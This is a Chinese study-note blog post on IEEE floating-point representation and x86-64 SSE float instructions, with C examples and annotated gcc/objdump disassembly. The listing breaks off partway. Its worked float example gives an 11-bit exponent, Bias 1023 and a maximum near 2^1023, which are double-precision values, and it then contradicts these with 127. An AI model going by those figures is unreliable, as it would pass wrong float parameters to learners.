<p>为啥要用exp全1,frac全0表示无穷大?这样表示岂不是会占用正常数的地址空间?</p>
<p>确实会占用,但是只占用了一种状态,exp还剩下$2^8-1&#x3D;255$种状态</p>
<p>像比于专门用两个状态位,这样exp还剩下6位,可以表示$2^6&#x3D;64$种状态</p>
<p>显然人家的规定更会挤牙膏</p>
</blockquote>
<blockquote>
<p>正负无穷大怎么表示的呢?</p>
<p>符号位决定正负,后面的exp全1frac全0表示无穷大</p>
<p>它甚至符号位和正常数都共用</p>
</blockquote>
<p>3.NaN,其和无穷大的表示,就是frac是否全0</p>
<blockquote>
<p>只要CPU读取一个浮点数,发现exp的8位全是1,他就知道要么是一个无穷大,要么不是数.反正不是好东西.</p>
<p>然后再检查后面frac的23位,要是有一个1就判定为NaN</p>
<p>这又挤了牙膏,设计出无穷大之后,NaN随之而来,甚至设计出无穷大之后再设计NaN都不会占用正常数的地址空间了</p>
</blockquote>
<p>4.正常数</p>
<p>正常数分为规格化数和非规格化数</p>
<p>区分两者是通过exp是否全0</p>
<p>至于啥是规格啥是非规格,这是后话,反正实际使用的时候都能用到并且没有显式的开关</p>
<h4 id="规格化数"><a href="#规格化数" class="headerlink" title="规格化数"></a>规格化数</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605193811879.png" alt="image-20220605193811879"></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>心里应该时刻悬着一个疑问,exp经过什么手续得到E阶码?</p>
<p>现在给你说这个手续是什么<br>$$<br>E&#x3D;exp-Bias\<br>$$<br>$$<br>exp&#x3D;e_{k-1}e_{k-2}…e_{1}e_{0}\<br>$$</p>
<p>$$<br>Bias&#x3D;2^{k-1}-1<br>$$</p>
<p>其中k是exp占用的二进制位数,</p>
<p>对于float来说,$k&#x3D;11,Bias&#x3D;2^{11-1}-1&#x3D;1023$</p>
<blockquote>
<p>懵逼了吧,Bias是个銱啊?</p>
<p>给一个定义$Bias&#x3D;2^{k-1}-1$,跟那该死的谜语人儿似的,不给说为啥这样整.</p>
<p>CSAPP上也是春秋笔法,留个后话,和某些人一样吊人胃口</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605194513398.png" alt="image-20220605194513398"></p>
<p>如果想要保持这层神秘感,那就继续看书,总会有一瞬间恍然大悟</p>
<p>如果急于知道原因,可以这样想:</p>
<p>1.我这样算出来的$E$,怎么表示正负呢?</p>
<p>虽然我整个数有一个符号s,但是阶码也应该有一个符号啊,$-1.01\times 2^2$和$-1.01\times 2^{-2}$这两个可不一样啊</p>
<p>按理说E的开头一位应该是符号啊,这样规定,没写符号位啊?</p>
<p>2.$Bias&#x3D;2^{k-1}-1$好大啊,用exp去减Bias不是以卵击石吗?剪完了十有八九是个负数啊?</p>
<p>这样想就在向Bias的设计目的靠拢了</p>
<p>先解决2.</p>
<p>对于float,k&#x3D;11<br>$$<br>Bias&#x3D;2^{11-1}-1&#x3D;2^{10}-1&#x3D;0111\ 1111\ 111\<br>$$<br>最高位竟然是0,剩下低位全是1</p>
<p>也就是说当$exp&#x3D;1XXX\ XXXX\ XXX$,这时候$exp-Bias$得到的是正数</p>
<p>而$exp$要么表示是$1XXX\ XXXX\ XXX$,要么是$0XXX\ XXXX\ XXX$</p>
<p>这两种情况平分秋色,就算是摇色子也是对半的几率落在两个范围内.</p>
<p>而我们希望阶码的正负数范围也是平分秋色,势均力敌的(差一两个无所谓)</p>
<p>现在就有雏形了</p>
<p>当$exp&#x3D;1XXX\ XXXX\ XXX$,$E&#x3D;exp-Bias$得到的就是正数</p>
<p>当$exp&#x3D;0XXX\ XXXX\ XXX$,$E&#x3D;exp-Bias$得到的就是负数</p>
<p>这好像和我们平常定义的正负数有出入啊?</p>
<p>通常都是0表示正数,1表示负数啊?这里为啥要倒过来exp最高位为1时表示正数,exp最高位为0时表示负数</p>
<p>这时候就要考虑方便排序比大小了</p>
<p>两个阶码$E1,E2$都是经过$exp1,exp2$减同一个数得到的,那么$E1&gt;E2$则$exp1&gt;exp2$</p>
<p>反过来也是这样,如果$exp1&gt;exp2$则$E1&gt;E2$</p>
<p>如果正数最高位为1负数最高位为0,那么很自然的$1&gt;0$,正数大于负数.</p>
<p>两个同号的exp比较时就从最高位遍历到最低位一视同仁</p>
<p>那么任意两个exp比较只需要从最高位遍历到最低位,谁的高位有1谁大</p>
<p>这样比较大小顺理成章,不用特判符号位</p>
<p>总结:</p>
<p>Bias这样设计考虑了排序方便,并且减去的这个数正好是区间的一半,相当于$[0,10]-5\Rightarrow[-5,5]$,使得正负数平分秋色.</p>
<p>解决了正负号问题同时附带着解决了大小问题,岂不美哉</p>
</blockquote>
<h4 id="frac"><a href="#frac" class="headerlink" title="frac"></a>frac</h4><p>前面说过,从frac到真正的尾数M也需要分类讨论办手续</p>
<p>现在就是分类讨论情况1</p>
<p>当exp不全为0也不全为1(即表示一个规格化数时)<br>$$<br>M&#x3D;1+frac&#x3D;1.f_{n-1}f_{n-2}…f_0<br>$$<br>即存储时自动忽略了小数点左边的1,计算式要加上</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>现在我们知道了exp到E的手续还有frac到M的手续,符号s没有手续.</p>
<p>手续齐全了,一个规格化数的表示和存储的关系我们也就明了了</p>
<p>还是以一开始举的例子,假设一个float的存储是这样的<br>$$<br>0’0000\ 0001’0000\ 0000\ 0000\ 0000\ 0000\ 001<br>$$</p>
<table>
<thead>
<tr>
<th>符号s</th>
<th>exp</th>
<th>frac</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0000 0001</td>
<td>0000 0000 0000 0000 0000 001</td>
</tr>
</tbody></table>
<p>$Bias&#x3D;0111\ 1111(2)&#x3D;127(10)$</p>
<p>$E&#x3D;exp&#x3D;Bias&#x3D;1-127&#x3D;-126(10)$</p>
<p>$M&#x3D;1+frac&#x3D;1.0000\ 0000\ 0000\ 0000\ 0000\ 001(2)&#x3D;1+2^{-23}(10)$<br>$$<br>\begin{aligned}<br>b&amp;&#x3D;(-1)^s\times M\times 2^E\<br>&amp;&#x3D;(-1)^0\times(1+2^{-23})\times 2^{-126}\<br>&amp;&#x3D;1\frac{1}{2^{23}}\times 2^{-126}<br>\end{aligned}<br>$$</p>
<h5 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h5><p>考虑一个exp有k位,frac有n位的规格化数能够表示的数的范围</p>
<p>首先考虑$exp$的范围,由于其不能全为0或者全为1,因此有$exp\in[00…001]$<br>$$<br>exp\in[\begin{matrix}\underbrace{000\cdots 0001}\k-1个0,1个1\end{matrix},\begin{matrix}\underbrace{111\cdots 1110}\k-1个1,1个0\end{matrix}]<br>$$<br>即$exp\in[1,2^{k}-2]$</p>
<p>那么$E&#x3D;exp-Bias&#x3D;exp-(2^{k-1}-1)\in [2-2^{k-1},2^{k-1}-1]$</p>
<p>$frac\in[0,\sum_{i&#x3D;-1}^{-n}2^i]&#x3D;[0,1-2^{-n}]$</p>
<p>$M&#x3D;1+frac\in[1,2-2^{-n}]$</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>最大值</th>
<th>最小值</th>
</tr>
</thead>
<tbody><tr>
<td>exp</td>
<td>$2^k-2$</td>
<td>1</td>
</tr>
<tr>
<td>E</td>
<td>$2^{k-1}-1$</td>
<td>$2-2^{k-1}$</td>
</tr>
<tr>
<td>frac</td>
<td>$1-2^{-n}$</td>
<td>0</td>
</tr>
<tr>
<td>M</td>
<td>$2-2^{-n}$</td>
<td>1</td>
</tr>
<tr>
<td>规格化数<strong>绝对值</strong></td>
<td>$(2-2^{-n})\times 2^{2^{k-1}-1}$</td>
<td>$2^{2-2^{k-1}}$</td>
</tr>
</tbody></table>
<p>比如对于float类型,k&#x3D;11,n&#x3D;23</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>最大值</th>
<th>最小值</th>
</tr>
</thead>
<tbody><tr>
<td>exp</td>
<td>$2^{11}-2&#x3D;2046$</td>
<td>1</td>
</tr>
<tr>
<td>E</td>
<td>$2^{11-1}-1&#x3D;1023$</td>
<td>$2-2^{11-1}&#x3D;-1022$</td>
</tr>
<tr>
<td>frac</td>
<td>$1-2^{-n}&#x3D;1-2^{-23}$</td>
<td>0</td>
</tr>
<tr>
<td>M</td>
<td>$2-2^{-n}&#x3D;2-2^{-23}$</td>
<td>1</td>
</tr>
<tr>
<td>规格化数<strong>绝对值</strong></td>
<td>$(2-2^{-23})\times 2^{2^{10}-1}&#x3D;(2-2^{-23})\times 2^{1023}$</td>
<td>$2^{2-2^{11-1}}&#x3D;2^{-1022}$</td>
</tr>
</tbody></table>
<h4 id="非规格化数"><a href="#非规格化数" class="headerlink" title="非规格化数"></a>非规格化数</h4><p>非规格化数是干啥用的呢?都叫他”非规格化”了,看来不规范,为啥还要用它呢?</p>
<p>现在要存储一个值为0的float.而规格化时我们要求$M$左边是1,存储的时候省去</p>
<p>对于0,打死也找不到一个1放在小数点左边啊</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><p>当exp全0时,存储的数就是一个非规格化数</p>
<p>这时求$E$的手续又有变化$E&#x3D;1-Bias$</p>
<p>$Bias&#x3D;2^{k-1}-1$不变</p>
<h5 id="frac-1"><a href="#frac-1" class="headerlink" title="frac"></a>frac</h5><p>求尾数M的手续也有变化$M&#x3D;frac$,没有隐含的1了</p>
<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>如果一个非规格化数的存储是这样的:<br>$$<br>0’0000\ 0000’0000\ 0000\ 0000\ 0000\ 0000\ 000<br>$$<br>全是0</p>
<p>$E&#x3D;1-Bias&#x3D;1-127&#x3D;-126$</p>
<p>$M&#x3D;frac&#x3D;0$<br>$$<br>b&#x3D;(-1)^0\times 0\times 2^{-126}&#x3D;0<br>$$</p>
<p>同理,如果只有符号位为1,由于M为0,我们也可以得到0</p>
<p>这两个0有区别,符号位0的为+0,符号位1的为-0.两者在计算$1&#x2F;+0,1&#x2F;-0$时分别得到正负无穷大</p>
<h5 id="范围-1"><a href="#范围-1" class="headerlink" title="范围"></a>范围</h5><p>$M&#x3D;frac\in[0,1-2^{-n}]$</p>
<p>$E&#x3D;1-Bias&#x3D;2-2^{k-1}$</p>
<p>阶是不变的,只有尾数$M$可以变</p>
<blockquote>
<p>到此仍然体会不到非规格化数的作用,仍然懵逼的很.不能就因为要表示0就单开一种类型吧?</p>
<p>这么说吧,非规格化数还可以表示距离0很近的数.啥意思呢?</p>
<p>注意非规格化数的阶码$E&#x3D;2-2^{k-1}$这个定值正好是<strong>规格化数阶码</strong>的最小值</p>
<p>再看尾数,规格化数的尾数最小是1,但是非规格化的尾数$M\in[0,1-2^{-n}]$永远小于1</p>
<p>规格化数最靠近0的数为$2^{2-2^{k-1}}$,不能再小了,但是非规格化数可以再通过改变尾数更接近0</p>
<p>即同为正数的 规格化数 一定大于 非规格化数</p>
<p>画在数轴上就是CSAPP给出的这幅图</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605210411034.png" alt="image-20220605210411034"></p>
<p>这里”偏置量”就是bias</p>
</blockquote>
<h3 id="以八位浮点数为例"><a href="#以八位浮点数为例" class="headerlink" title="以八位浮点数为例"></a>以八位浮点数为例</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605210629786.png"></p>
<p>这个表上可以发现很多问题</p>
<h4 id="1-非规格化数呈现等差数列-相邻两项相差-frac-1-512-这是为什么"><a href="#1-非规格化数呈现等差数列-相邻两项相差-frac-1-512-这是为什么" class="headerlink" title="1.非规格化数呈现等差数列,相邻两项相差$\frac{1}{512}$,这是为什么?"></a>1.非规格化数呈现等差数列,相邻两项相差$\frac{1}{512}$,这是为什么?</h4><p>非规格化数的阶码是固定的,用$C&#x3D;2^{2-2^{k-1}}&#x3D;2^{-6}&#x3D;\frac{1}{64}$表示固定的权</p>
<p>尾数$M$从$0$逐次增加$\frac{1}{8}$,那么非规格化数序列就是$0C,\frac{1}{8}C,\frac{2}{8}C…\frac{7}{8}C$</p>
<p>任意相邻两项差均为$\frac{1}{8}C$为定值</p>
<h4 id="2-从最大的非规格化数到最小的规格化数貌似仍然维持了非规格化数的公差-那么规格化数也是等差数列吗"><a href="#2-从最大的非规格化数到最小的规格化数貌似仍然维持了非规格化数的公差-那么规格化数也是等差数列吗" class="headerlink" title="2.从最大的非规格化数到最小的规格化数貌似仍然维持了非规格化数的公差,那么规格化数也是等差数列吗?"></a>2.从最大的非规格化数到最小的规格化数貌似仍然维持了非规格化数的公差,那么规格化数也是等差数列吗?</h4><p>不是</p>
<p>相邻两个规格化数的增长,既要考虑阶码的增长的可能,又要考虑尾数增长的可能</p>
<p>对于一个固定的阶码,尾数只有$0,\frac{1}{8},…,\frac{7}{8}$这8种情况,同一个阶码下的这八项组成等差数列</p>
<p>但是换一个阶码,和刚才的尾数就组不成等差数列了,$\frac{1}{8}C_1$和$\frac{1}{8}C_2$不一样大</p>
<p>因此规格化数随着阶码增大,在数轴上的距离将会离得越来越远</p>
<h4 id="3-阶码最小的规格化数一定可以和非规格化数”平滑过渡”吗"><a href="#3-阶码最小的规格化数一定可以和非规格化数”平滑过渡”吗" class="headerlink" title="3.阶码最小的规格化数一定可以和非规格化数”平滑过渡”吗"></a>3.阶码最小的规格化数一定可以和非规格化数”平滑过渡”吗</h4><p>是的</p>
<p>阶码最小时$exp&#x3D;1$</p>
<p>此时$exp-Bias&#x3D;1-Bias$即阶码最小的规格化数和非规格化数的阶码是相同的</p>
<p>两种数的区别在于尾数前面是否有隐含的1</p>
<p>而非规格化数恰好从0增长到1之前缺一个单元,阶码最小的规格化数尾数恰好从1开始增长,接了非规格化数的班</p>
<p>我们的上述2.3两点在CSAPP给出的插图2-34中得到了验证</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605212121233.png" alt="image-20220605212121233"></p>
<p>a)中约靠近中心,规格化数之间的距离越近(单调不增),越靠近两头规格化数之间的距离越远(单调不减).</p>
<p>一定范围内规格化数距离相同,是因为该几个规格化数的阶码相同,只有尾数不同</p>
<p>b)中最小的规格化数和非规格化数呈等差数列</p>
<h3 id="舍入问题"><a href="#舍入问题" class="headerlink" title="舍入问题"></a>舍入问题</h3><p>向偶数舍入:</p>
<blockquote>
<p>不是四舍五入,不是向上向下舍入</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605213150852.png" alt="image-20220605213150852"></p>
<p>在类型转换从浮点数到整数时还是使用向0舍入</p>
<p>向偶舍入是一个浮点数表示不开的时候采用的方法</p>
<h2 id="x86-64上浮点数的机器级表示"><a href="#x86-64上浮点数的机器级表示" class="headerlink" title="x86-64上浮点数的机器级表示"></a>x86-64上浮点数的机器级表示</h2><h3 id="16个媒体寄存器"><a href="#16个媒体寄存器" class="headerlink" title="16个媒体寄存器"></a>16个媒体寄存器</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605215315252.png" alt="image-20220605215315252"></p>
<p>这里媒体寄存器都长的出奇,最短的用法是128位的xmm寄存器</p>
<p>然而一个浮点类型,要么是32位的float,要么是64位的double,</p>
<p>既然常用类型最长64位,为啥要整128甚至256位的寄存器呢?</p>
<blockquote>
<p>目前猜测这些寄存器不光有存放浮点类型的作用</p>
<p>否则不会叫做”媒体”寄存器,怎么不改名浮点寄存器</p>
<p>实际上看了后面确实如此,xmm,ymm寄存器可以一次性存放好几个值</p>
<p>$[x_1,x_2,x_3,x_4]$这种向量,其中每一个x都是一个float,合起来一共128位刚好占用一共xmm寄存器.</p>
<p>如果是四个double组成的向量则恰好一个ymm寄存器</p>
</blockquote>
<h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><h4 id="标量指令"><a href="#标量指令" class="headerlink" title="标量指令"></a>标量指令</h4><p>为了理解”标量”这个概念,必须得和”向量”这个概念联系对比</p>
<p>当然这里的向量和标量不是数学物理上的概念</p>
<p>更像是概率论与数理童祭时学的概念</p>
<p>X是一个样本,$X_i$是样本成员<br>$$<br>X&#x3D;[X_1,X_2,X_3,…,X_n]<br>$$<br>这里$X$就是一个向量,他是有一群标量$X_1,X_2,…,X_n$按照顺序组成的集合</p>
<p>又比如一个有着横纵坐标的二维几何点就可以叫做一个”向量”$P(X,Y)$</p>
<p>标量就是一个数据</p>
<p>而向量是一组数据</p>
<p><strong>标量指令</strong>对单个数据进行操作,一条标量指令只涉及一个数据的传递等操作</p>
<p>而<strong>向量指令</strong>可以一条指令完成对多个数据的操作</p>
<p>在接触浮点数的机器表示时,我们没有见过”向量指令”这个说法,是因为之前一直都是标量指令,不涉及向量的概念,当时CSAPP没有必要引入一个概念吓唬初学者</p>
<p><strong>引用内存的指令是标量指令</strong></p>
<p>也就是从寄存器到内存或者从内存到寄存器,只能一次搬一个数据,不能搬多了</p>
<p>那么可以推测,有这么一些指令,可以在xmm寄存器之间一口气搬好几个数据</p>
<h4 id="浮点传送指令"><a href="#浮点传送指令" class="headerlink" title="浮点传送指令"></a>浮点传送指令</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220606145220374.png" alt="image-20220606145220374"></p>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">float</span> a=<span class="number">12</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">float</span> b=a;<span class="comment">//使用register修饰提醒编译器使用寄存器存放a变量,但是实际上编译器很可能忽略</span></span><br><span class="line">    <span class="type">float</span> c=a;</span><br><span class="line">    <span class="type">float</span> *d=&amp;c;</span><br><span class="line">    <span class="type">float</span> e=*d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ gcc main.c -O0 -o main</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ objdump main -d &gt; main.asm</span><br></pre></td></tr></table></figure>

<p><code>main.asm</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0000000000001129 &lt;func&gt;:</span><br><span class="line">    1129:	55                   	push   %rbp</span><br><span class="line">    112a:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    112d:	f3 0f 10 0d cf 0e 00 	movss  0xecf(%rip),%xmm1        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1134:	00 </span><br><span class="line">    1135:	f3 0f 11 4d f0       	movss  %xmm1,-0x10(%rbp)</span><br><span class="line">    113a:	48 8d 45 f0          	lea    -0x10(%rbp),%rax</span><br><span class="line">    113e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">    1142:	48 8b 45 f8          	mov    -0x8(%rbp),%rax</span><br><span class="line">    1146:	f3 0f 10 00          	movss  (%rax),%xmm0</span><br><span class="line">    114a:	f3 0f 11 45 f4       	movss  %xmm0,-0xc(%rbp)</span><br><span class="line">    114f:	90                   	nop</span><br><span class="line">    1150:	5d                   	pop    %rbp</span><br><span class="line">    1151:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>这里面<code>a,b,c,d,e</code>分别以什么形式存储呢?这得联系上下文了</p>
<p><code>movss  0xecf(%rip),%xmm1</code>从内存rodata区到寄存器使用了<code>movss</code>指令,对应<code>register float a=12;</code>,即a存放在xmm1中</p>
<p><code>movss  %xmm1,-0x10(%rbp)</code>从寄存器到内存栈区使用了<code>movss</code>指令,</p>
<p>可能对应<code>register float b=a;</code>,因为编译器有可能忽略register修饰,也可能对应<code>float c=a;</code></p>
<p>怎么区分这两种情况呢?源代码下文中有对c的地址引用,因此后面如果有对<code>-0x10(%rbp)</code>的地址引用操作, 那么可以判定为c</p>
<p><code>lea    -0x10(%rbp),%rax</code>,rax中存放刚才搬进栈区的局部变量的地址</p>
<p><code>mov    %rax,-0x8(%rbp)</code>这个地址通过rax中转放到栈上,这一步明显对应<code>float *d=&amp;c;</code>,</p>
<p>那么可以推出,d放在栈区<code>-0x8(%rbp)</code>,c放在栈区<code>-0x10(%rbp)</code></p>
<p><code>mov    -0x8(%rbp),%rax</code>这步实际上没有作用,rax之前就是存的<code>-0x8(%rbp)</code>,只不过<code>-O0</code>优化显得编译器根傻子一样</p>
<p><code>movss  (%rax),%xmm0</code>,<code>*d</code>放到寄存器xmm0里,</p>
<p><code>movss  %xmm0,-0xc(%rbp)</code> <code>*d</code>通过xmm0中转了一下又放到栈区</p>
<p>显然对应<code> float e=*d;</code>,<code>e</code>放在了栈区<code>-0xc(%rbp)</code></p>
<p>见鬼的是<code>register float b=a;</code>这句好像没有起作用.为了保证我们没有出现幻觉,源代码中去掉这一句重新编译然后反编译\</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">float</span> a=<span class="number">12</span>;</span><br><span class="line">    <span class="comment">// register float b=a;</span></span><br><span class="line">    <span class="type">float</span> c=a;</span><br><span class="line">    <span class="type">float</span> *d=&amp;c;</span><br><span class="line">    <span class="type">float</span> e=*d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ gcc main.c -O0 -o main -g</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ objdump main -d &gt; main.asm</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0000000000001129 &lt;func&gt;:</span><br><span class="line">    1129:	55                   	push   %rbp</span><br><span class="line">    112a:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    112d:	f3 0f 10 0d cf 0e 00 	movss  0xecf(%rip),%xmm1        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1134:	00 </span><br><span class="line">    1135:	f3 0f 11 4d f0       	movss  %xmm1,-0x10(%rbp)</span><br><span class="line">    113a:	48 8d 45 f0          	lea    -0x10(%rbp),%rax</span><br><span class="line">    113e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">    1142:	48 8b 45 f8          	mov    -0x8(%rbp),%rax</span><br><span class="line">    1146:	f3 0f 10 00          	movss  (%rax),%xmm0</span><br><span class="line">    114a:	f3 0f 11 45 f4       	movss  %xmm0,-0xc(%rbp)</span><br><span class="line">    114f:	90                   	nop</span><br><span class="line">    1150:	5d                   	pop    %rbp</span><br><span class="line">    1151:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>和刚才一模一样<code>register float b=a;</code>这句直接被优化掉了</p>
<p>哦上帝啊,<code>-O0</code>的gcc竟然也会有优化</p>
<h4 id="浮点转换指令"><a href="#浮点转换指令" class="headerlink" title="浮点转换指令"></a>浮点转换指令</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220606152907983.png" alt="image-20220606152907983"></p>
<p>一看就明白,没必要做实验分析了 </p>
<h4 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h4><p>比较指令,位级运算指令都是按位进行的,类比整数的情形即可</p>
<h3 id="System-V-调用约定"><a href="#System-V-调用约定" class="headerlink" title="System V 调用约定"></a>System V 调用约定</h3><h4 id="参数传递约定"><a href="#参数传递约定" class="headerlink" title="参数传递约定"></a>参数传递约定</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">float</span> a,<span class="type">float</span> b,<span class="type">float</span> c,<span class="type">float</span> d,<span class="type">float</span> e,</span></span><br><span class="line"><span class="params">          <span class="type">float</span> f,<span class="type">float</span> g,<span class="type">float</span> h,<span class="type">float</span> i,<span class="type">float</span> j)</span></span><br><span class="line">		&#123;&#125;<span class="comment">//传递十个参数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# gcc main.c -O0 -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# objdump main -d &gt; main.asm</span><br></pre></td></tr></table></figure>

<p><code>main.asm</code></p>
<p>main函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">0000000000001158 &lt;main&gt;:</span><br><span class="line">;开端,帧指针压栈保存,帧指针获得此时栈顶指针拷贝</span><br><span class="line">    1158:	55                   	push   %rbp</span><br><span class="line">    1159:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    ;func的参数从右向左压栈,首先安排10的位置</span><br><span class="line">    ;PC相对寻址,将M[rip+0xea0]放在xmm0寄存器</span><br><span class="line">    115c:	f3 0f 10 05 a0 0e 00 	movss  0xea0(%rip),%xmm0        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1163:	00 </span><br><span class="line">    1164:	48 8d 64 24 f8       	lea    -0x8(%rsp),%rsp	;rsp=rsp-8,栈上申请8字节空间</span><br><span class="line">    1169:	f3 0f 11 04 24       	movss  %xmm0,(%rsp)		;从xmm0搬到M[rsp]上</span><br><span class="line">    </span><br><span class="line">    ;重复刚才的过程,压栈从右向左数的第二个参数</span><br><span class="line">    116e:	f3 0f 10 05 92 0e 00 	movss  0xe92(%rip),%xmm0        # 2008 &lt;_IO_stdin_used+0x8&gt;</span><br><span class="line">    1175:	00 </span><br><span class="line">    